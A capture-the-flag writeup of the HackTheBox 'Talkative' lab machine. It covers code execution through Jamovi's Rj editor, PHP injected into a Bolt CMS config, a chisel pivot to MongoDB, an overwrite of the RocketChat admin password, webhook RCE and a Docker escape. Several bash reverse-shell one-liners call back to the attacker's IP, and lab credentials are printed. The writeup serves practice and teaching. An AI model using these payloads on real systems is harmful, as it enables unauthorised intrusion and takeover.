---
layout: post
title: Talkative writeup.
subtitle: From HackTheBox CTF platform.
cover-img: /assets/img/Talkative.png
thumbnail-img: /assets/img/talkative.png
share-img: /assets/img/Talkative.jpg
tags: [hackthebox, ctf, hard, docker]
---

# About the machine: 

Talktive is a pretty hard machine with a lot to learn. We start by getting a shell by exploiting Jamovi's Rj editor. 

# Nmap 

```bash
└─$ nmap -sC -sV -Pn -oA nmap 10.10.11.155 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-18 16:25 +01
Nmap scan report for 10.10.11.155
Host is up (0.060s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT     STATE    SERVICE VERSION
22/tcp   filtered ssh
80/tcp   open     http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://talkative.htb
|_http-server-header: Apache/2.4.52 (Debian)
3000/tcp open     ppp?
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     X-XSS-Protection: 1
|     X-Instance-ID: ak9yCo5W93xA2eZWv
|     Content-Type: text/html; charset=utf-8
|     Vary: Accept-Encoding
|     Date: Thu, 18 Aug 2022 15:27:01 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <link rel="stylesheet" type="text/css" class="__meteor-css__" href="/3ab95015403368c507c78b4228d38a494ef33a08.css?meteor_css_resource=true">
|     <meta charset="utf-8" />
|     <meta http-equiv="content-type" content="text/html; charset=utf-8" />
|     <meta http-equiv="expires" content="-1" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
|     <meta name="fragment" content="!" />
|     <meta name="distribution" content="global" />
|     <meta name="rating" content="general" />
|     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
|     <meta name="mobile-web-app-capable" content="yes" />
|     <meta name="apple-mobile-web-app-capable" conten
|   Help, NCP: 
|_    HTTP/1.1 400 Bad Request
8080/tcp open     http    Tornado httpd 5.0
|_http-title: jamovi
|_http-server-header: TornadoServer/5.0
8081/tcp open     http    Tornado httpd 5.0
|_http-title: 404: Not Found
|_http-server-header: TornadoServer/5.0
8082/tcp open     http    Tornado httpd 5.0
|_http-title: 404: Not Found
|_http-server-header: TornadoServer/5.0
```

# Enumerating Web

Visiting port 80, we get a website. One thing you can notice are the names of the Cheifs in the footer. Let's consider them as possible usernames.

```
Janit Smith (Chief Financial Officer)
Saul Goodman (Chief Executing Officer)
Matt Williams (Chief Marketing Officer & Head of Design)
```

Port 3000 has RocketChat login form at `http://10.10.11.155:3000/home`. But port 8080 sparked my interest more because it has a dahsboard open at : 
`http://10.10.11.155:8080/?id=e82c72bb-8c93-4688-8ed3-7fde506c1eda`

Jamovi is a free and open statistical software. After doing some research I found that maybe we can execute code inside the  Rj Editor using R promramming language. 

From the jamovi docs: RJ Editor is a new module for the jamovi statistical spreadsheet that allows you to use the R programming language to analyse data from within jamovi. 


# SHELL using JAMOVI

One thing you love about HTB is it always push you to try new things. In this case, it's R programming language.

Some analyses in jamovi can be created using R code with the Rj Editor. This allows for great flexibility in what analyses can be run, however due to the flexibility of R code, it’s possible for someone to write an analysis which does malicious things, such as deleting files. This is a similar situation to other software which allows arbitrary code, such as macros in Microsoft Word or Excel.
[See more](https://www.jamovi.org/about-arbitrary-code.html)

Reading the docs [here]() We can execute commands through  `system(command, inten=TRUE)`

I got a shell using: 

`system("bash -c 'bash -i >& /dev/tcp/10.10.14.68/1337 0>&1'")`


```bash
└─$ nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.10.14.68] from (UNKNOWN) [10.10.11.155] 47030
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@b06821bbda78:/# ls
```

# SHELL from Bolt-CMS

tried: 

```bash
root@b06821bbda78:/# ip a s
ip a s
bash: ip: command not found
```

Cheking other user: 

```bash
root@b06821bbda78:/# cat /etc/passwd | grep 'bash'
cat /etc/passwd | grep 'bash'
root:x:0:0:root:/root:/bin/bash
```

Found some files in /root

```bash
root@b06821bbda78:/# ls /root
ls /root
Documents
bolt-administration.omv
```
Switched to Pwncat. What's pwncat? I am working on a special tutorial for it. But for now, let's say it's just a fancy shell.

[Install pwncat](https://pwncat.readthedocs.io/en/latest/installation.html)

After downloading bolt-administartion.omv and unzipping it, I got: 

```bash
└─$ unzip bolt-administration.omv
Archive:  bolt-administration.omv
  inflating: META-INF/MANIFEST.MF    
  inflating: meta                    
  inflating: index.html              
  inflating: metadata.json           
  inflating: xdata.json              
  inflating: data.bin                
  inflating: 01 empty/analysis 
```
Reading the content of `xdata.json`, I got some passwords and usernames. Juicy! 

```bash
└─$ cat xdata.json | jq
{
  "A": {
    "labels": [
      [
        0,
        "Username",
        "Username",
        false
      ],
      [
        1,
        "matt@talkative.htb",
        "matt@talkative.htb",
        false
      ],
      [
        2,
        "janit@talkative.htb",
        "janit@talkative.htb",
        false
      ],
      [
        3,
        "saul@talkative.htb",
        "saul@talkative.htb",
        false
      ]
    ]
  },
  "B": {
    "labels": [
      [
        0,
        "Password",
        "Password",
        false
      ],
      [
        1,
        "jeO09ufhWD<s",
        "jeO09ufhWD<s",
        false
      ],
      [
        2,
        "bZ89h}V<S_DA",
        "bZ89h}V<S_DA",
        false
      ],
      [
        3,
        ")SQWGm>9KHEA",
        ")SQWGm>9KHEA",
        false
      ]
    ]
  },
  "C": {
    "labels": []
  }
}
```

Let's try to use them in Bolt CMS since the name of the file starts with Bolt. I couldn't login with the username provided with file, but I managed to make it to the dashboard with admin as a username: `admin:jeO09ufhWD<s`. 

Checking the vendor's docs for default credentials and usernames is a nice trick you should ALWAYS try. 

It turns out that the version version 5.1.3. And saul is the admin though. 

Browsing the CMS for a while, I noticed that there are several configurations files at: http://talkative.htb/bolt/filemanager/config

Looking at config/bundles.php, I see a bunch of php code. Let's inject ours and hope for a shell. 

In bundles.php, `exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.159/1338 0>&1'");`. 

![bolt-cms bundle](/assets/img/bundle-config.png)

I got a session with pwncat as a `www-data` inside another conatiner.

# Escalating to SSH as saul. 

There's no other user:

```bash
(remote) www-data@c659d3af128a:/var/www/talkative.htb/bolt/public$ cat /etc/passwd | grep 'bash'
root:x:0:0:root:/root:/bin/bash
(remote) www-data@c659d3af128a:/var/www/talkative.htb/bolt/public$ ls /home
(remote) www-data@c659d3af128a:/var/www/talkative.htb/bolt/public$ 
```
Let's check the ip address with `hostname -I `

```bash
(remote) www-data@c659d3af128a:/var/www$ hostname -I 
172.17.0.14
```
Discovered that ssh port is open in address 172.17.0.1. I used this cool one liner to scan ssh port: 

```bash
(remote) www-data@d6b75aaee51b:/var/www/talkative.htb/bolt/public$ for i in {1..255};do (echo </dev/tcp/172.17.0.$i/22) &>/dev/null && echo -e "\n[+] Open port at:\t$i" || (echo -n "."&&exit 1);done

[+] Open port at:       1
```
I got ssh with saul the admin using password: `jeO09ufhWD<s`
 
Saul has the user.txt file (forget to screenshot it because there's no need.)

Running linpease: 

```bash
saul@talkative:/tmp$ ./linpease.sh 


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------\
    |                             Do you like PEASS?                            |                                                                                                            
    |---------------------------------------------------------------------------|                                                                                                            
    |         Get latest LinPEAS  :     https://github.com/sponsors/carlospolop |                                                                                                            
    |         Follow on Twitter   :     @carlospolopm                           |                                                                                                            
    |         Respect on HTB      :     SirBroccoli                             |                                                                                                            
    |---------------------------------------------------------------------------|                                                                                                            
    |                                 Thank you!                                |                                                                                                            
    \---------------------------------------------------------------------------/                                                                                                            
          linpeas-ng by carlospolop                                                                                                                                                          
                                                                                                                                                                                             
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission. 

```

Running pspy64 for proccesses enumeration.

```bash
saul@talkative:/tmp$ ./pspy64 
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     
I got some errors with linpease and I was tired. However, I decided to enumerate proccesses with [pspy](https://github.com/DominicBreuker/pspy). 

```
Notice something interesting? 

```bash
2022/08/22 11:18:01 CMD: UID=0    PID=35318  | /usr/sbin/CRON -f 
2022/08/22 11:18:01 CMD: UID=0    PID=35317  | /usr/sbin/CRON -f 
2022/08/22 11:18:01 CMD: UID=0    PID=35322  | /bin/sh -c python3 /root/.backup/update_mongo.py 
2022/08/22 11:18:01 CMD: UID=0    PID=35321  | 
2022/08/22 11:18:01 CMD: UID=0    PID=35320  | 
2022/08/22 11:18:01 CMD: UID=0    PID=35323  | python3 /root/.backup/update_mongo.py 

```

Again


```bash
2022/08/22 11:21:01 CMD: UID=0    PID=35360  | python3 /root/.backup/update_mongo.py 
2022/08/22 11:21:01 CMD: UID=0    PID=35359  | /bin/sh -c python3 /root/.backup/update_mongo.py 
```

That's a job running every couple of minuts. MongoDB is running. Let's check it. 
Mongodb default port is 27017.


```bash
tcp        0      0 172.17.0.1:36868        172.17.0.2:27017        TIME_WAIT  
tcp        0      0 172.17.0.1:36870        172.17.0.2:27017        TIME_WAIT  
```

# Pivoting to MongoDB.

We need to connect to `172.17.0.2` through `172.17.0.1`. Let's do chisel. 

On my machine
`chisel server --reverse --port 9000`

```bash
└─$ chisel server --reverse --port 9000
2022/08/22 13:21:28 server: Reverse tunnelling enabled
2022/08/22 13:21:28 server: Fingerprint Edh+JgL8qk+dwz7lq/slzgJ7SInwv51phisB5HfmReI=
2022/08/22 13:21:28 server: Listening on http://0.0.0.0:9000
2022/08/22 13:22:23 server: session#1: Client version (1.7.7) differs from server version (0.0.0-src)
2022/08/22 13:22:23 server: session#1: tun: proxy#R:27017=>172.17.0.2:27017: Listening
```
On the remote ssh 

`./chisel client 10.10.14.159:9000 R:27017:172.17.0.2:27017`

```bash
saul@talkative:/tmp$ ./chisel client 10.10.14.159:9000 R:27017:172.17.0.2:27017
2022/08/22 12:24:02 client: Connecting to ws://10.10.14.159:9000
2022/08/22 12:24:03 client: Connected (Latency 169.482446ms)
```

Downloaded https://www.mongodb.com/try/download/shell
after installing, we connect to mongodb through the default port. 

```bash
 mongosh mongodb://127.0.0.1:27017
Current Mongosh Log ID: 63038214049628f125652a2a
Connecting to:          mongodb://127.0.0.1:27017/?directConnection=true&serverSelectionTimeoutMS=2000&appName=mongosh+1.5.4
Using MongoDB:          4.0.26
Using Mongosh:          1.5.4

For mongosh info see: https://docs.mongodb.com/mongodb-shell/
------
   The server generated these startup warnings when booting
   2022-08-22T06:51:09.751+0000: 
   2022-08-22T06:51:09.751+0000: ** WARNING: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine
   2022-08-22T06:51:09.751+0000: **          See http://dochub.mongodb.org/core/prodnotes-filesystem
   2022-08-22T06:51:12.235+0000: 
   2022-08-22T06:51:12.235+0000: ** WARNING: Access control is not enabled for the database.
   2022-08-22T06:51:12.235+0000: **          Read and write access to data and configuration is unrestricted.
   2022-08-22T06:51:12.236+0000:
------

rs0 [direct: primary] test> 

```

Following the documentation, we see that we can change the admin to 12345 using:

https://docs.rocket.chat/guides/administration/admin-panel/advanced-admin-settings/restoring-an-admin

```bash
rs0 [direct: primary] parties> show dbs
admin   104.00 KiB
config  124.00 KiB
local    11.48 MiB
meteor    4.64 MiB

rs0 [direct: primary] parties> use meteor
switched to db meteor

rs0 [direct: primary] parties> db.getCollection('users').update({username:"admin"}, { $set: {"services" : { "password" : {"bcrypt" : "$2a$10$n9CM8OgInDlwpvjLKLPML.eizXIzLlRtgCh3GRLafOdR9ldAUh/KG" } } } })
{
  acknowledged: true,
  insertedId: null,
  matchedCount: 0,
  modifiedCount: 0,
  upsertedCount: 0
}

```
Let's go back to RocketChat at port 3000 and login using admin:12345

```nodejs
const require = console.log.constructor('return process.mainModule.require')();
const { exec } = require('child_process');
exec('command here');
```
Found this CVE: https://github.com/CsEnox/CVE-2021-22911. In this description of the PoC I read: 

RCE ( Autenticated - Admin )
Rocket.Chat has a feature called Integrations that allows creating incoming and outgoing web hooks. These web hooks can have scripts associated with them that are executed when the web hook is triggered.

Salute to the creator of the poc because he mentioned all the steps required to get an RCE. So since I already had the ability to create a webhook, I just coppied the payload used in the script. 

So here it is. 

First, we go to Administration and to integrations. `http://talkative.htb:3000/admin/integrations`

We fill up the form as required. 

Let's add to the script 

```
const require = console.log.constructor('return process.mainModule.require')();
require('child_process').exec('bash -c "bash -i >& /dev/tcp/10.10.14.159/1337 0>&1"');
```

![RocketChat webhook](/assets/img/webhook.png)

Click Save. 

My screenshot is in French because RocketChat decided to chose French based on location (Morocco). We speak Arabic, Tamazight, French is second laguage. RocketChat doesn't know that. Anyway, we save the webhook, then we get an URL.

```
http://talkative.htb:3000/hooks/euqRqTJmGhbBzpbXJ/BFRHtiXhLPM2wwwtMo4ka7e4QvXWGhLGnaFNuwK8LWHzEzy3
```

Let's trigger the webhook. Pwncat is already waiting.

```bash
└─$ curl http://talkative.htb:3000/hooks/euqRqTJmGhbBzpbXJ/BFRHtiXhLPM2wwwtMo4ka7e4QvXWGhLGnaFNuwK8LWHzEzy3
{"success":false}                                                                                                                                                                                     
```

Here it is. 

```bash
└─$ pwncat-cs -lp 1337         
[13:02:31] Welcome to pwncat 🐈!                                                                                                                                              __main__.py:164
[13:11:19] received connection from 10.10.11.155:40896                                                                                                                             bind.py:84
[13:11:21] 10.10.11.155:40896: registered new host w/ db                                                                                                                       manager.py:957
(local) pwncat$                                                                                                                                                                              
(remote) root@c150397ccd63:/app/bundle/programs/server# ls
app            boot-utils.js.map  config.json   mini-files.js      npm                      npm-rebuild.js      npm-require.js       package.json  profile.js.map  runtime.js.map
assets         boot.js            debug.js      mini-files.js.map  npm-rebuild-args.js      npm-rebuild.js.map  npm-require.js.map   packages      program.json    server-json.js
boot-utils.js  boot.js.map        debug.js.map  node_modules       npm-rebuild-args.js.map  npm-rebuilds.json   npm-shrinkwrap.json  profile.js    runtime.js      server-json.js.map
(remote) root@c150397ccd63:/app/bundle/programs/server# whoami
root

```
# Escaping Docker Container with CDK and read root flag. 

Another container! Now we are at `172.17.0.3`

Looking at: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation

I found this tool: https://github.com/cdk-team/CDK#installationdelivery

```bash
(local) pwncat$ upload hackthebox/tools/linux/cdk
./cdk ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 11.9/11.9 MB • 114.6 kB/s • 0:00:00
[13:36:41] uploaded 11.91MiB in 1.0 minutes and 30 seconds                                                                                                                       upload.py:76
(local) pwncat$                                                                                                                                                                              
(remote) root@c150397ccd63:/# ls
app  bin  boot  cdk  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
(remote) root@c150397ccd63:/# mv cdk /root
(remote) root@c150397ccd63:/# cd root
(remote) root@c150397ccd63:/root# ls
cdk
(remote) root@c150397ccd63:/root# chmod +x cdk
(remote) root@c150397ccd63:/root# ./cdk
CDK (Container DucK)
CDK Version(GitCommit): 548ef65dd14313a27c2bef15b7d1bff57bf6a98c
Zero-dependency cloudnative k8s/docker/serverless penetration toolkit by cdxy & neargle
Find tutorial, configuration and use-case in https://github.com/cdk-team/CDK/wiki

Usage:
  cdk evaluate [--full]
  cdk eva [--full]
  cdk run (--list | <exploit> [<args>...])
  cdk auto-escape <cmd>
  cdk <tool> [<args>...]

Evaluate:
  cdk evaluate                              Gather information to find weakness inside container.
  cdk eva                                   Alias of "cdk evaluate".
  cdk evaluate --full                       Enable file scan during information gathering.


Exploit:
  cdk run --list                            List all available exploits.
  cdk run <exploit> [<args>...]             Run single exploit, docs in https://github.com/cdk-team/CDK/wiki
  cdk auto-escape <cmd>                     Escape container in different ways then let target execute <cmd>.

Tool:
  vi <file>                                 Edit files in container like "vi" command.
  ps                                        Show process information like "ps -ef" command.
  nc [options]                              Create TCP tunnel.
  ifconfig                                  Show network information.
  kcurl <path> (get|post) <uri> [<data>]    Make request to K8s api-server.
  ectl <endpoint> get <key>                 Unauthorized enumeration of ectd keys.
  ucurl (get|post) <socket> <uri> <data>    Make request to docker unix socket.
  probe <ip> <port> <parallel> <timeout-ms> TCP port scan, example: cdk probe 10.0.1.0-255 80,8080-9443 50 1000

Options:
  -h --help     Show this help msg.
  -v --version  Show version.

```
Checking the tool's wiki I found this exploit which give me the previlige to read arbitary files.

If container is run with `CAP_DAC_READ_SEARCH` capability it is able to read arbitrary file from host system. This is possible because CAP_DAC_READ_SEARCH gives ability to bypass DAC (discretionary access control) checks and open files by file handles which are global file identifiers


```bash
 ./cdk run cap-dac-read-search /root/root.txt
```

This is it. 